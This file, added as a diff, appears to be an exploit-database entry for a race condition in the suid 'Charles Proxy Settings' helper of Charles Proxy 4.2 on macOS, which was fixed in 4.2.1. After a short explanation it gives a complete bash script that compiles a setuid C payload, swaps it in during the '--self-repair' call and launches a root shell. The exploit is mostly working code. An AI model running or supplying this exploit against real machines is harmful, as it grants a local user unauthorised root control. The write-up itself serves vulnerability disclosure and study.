@@ -1,0 +1,80 @@
+Charles Proxy is a great mac application for debugging web services and
+inspecting SSL traffic for any application on your machine.
+
+In order to inspect the SSL traffic it needs to configure the system to use a
+proxy so that it can capture the packets and use its custom root CA to decode
+the SSL.
+
+Setting a system-wide proxy requires root permissions so this is handled by an
+suid binary located within the Charles application folder:
+
+/Applications/Charles.app/Contents/Resources/Charles Proxy Settings
+
+Unfortunately this binary is vulnerable to a race condition which allows a local
+user to spawn a root shell. It supports a parameter "--self-repair" which it
+uses to re-set the root+suid permissions on itself, with a graphical dialog
+shown to the user. However if this is called when the binary is already
+root+suid then no password dialog is shown.
+
+It doesn't validate the path to itself and uses a simple API call to get the
+path to the binary at the time it was invoked. This means that between executing
+the binary and reaching the code path where root+suid is set there is enough
+time to replace the path to the binary with an alternate payload which will then
+receive the suid+root permissions instead of the Charles binary.
+
+This issue was fixed in Charles 4.2.1 released in November 2017.
+
+https://m4.rkw.io/charles_4.2.sh.txt
+2f4a2dca6563d05a201108ec6e9454e2894b603b68b3b70b8f8b043b43ee9284
+-------------------------------------------------------------------------------
+#!/bin/bash
+
+####################################################
+###### Charles 4.2 local root privesc exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html ######
+####################################################
+
+cd
+user="`whoami`"
+
+cat > charles_exploit.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","rm -f \"/Users/$user/Charles Proxy Settings\"; /bin/bash",NULL);
+  return 0;
+}
+EOF
+
+gcc -o charles_exploit charles_exploit.c
+if [ $? -ne 0 ] ; then
+  echo "failed to compile the exploit, you need xcode cli tools for this."
+  exit 1
+fi
+rm -f charles_exploit.c
+
+ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
+./Charles\ Proxy\ Settings --self-repair 2>/dev/null &
+rm -f ./Charles\ Proxy\ Settings
+mv charles_exploit Charles\ Proxy\ Settings
+
+i=0
+
+while :
+do
+  r=`ls -la Charles\ Proxy\ Settings |grep root`
+  if [ "$r" != "" ] ; then
+    break
+  fi
+  sleep 0.1
+  i=$((i+1))
+  if [ $i -eq 10 ] ; then
+    rm -f Charles\ Proxy\ Settings
+    echo "Not vulnerable"
+    exit 1
+  fi
+done
+
+./Charles\ Proxy\ Settings
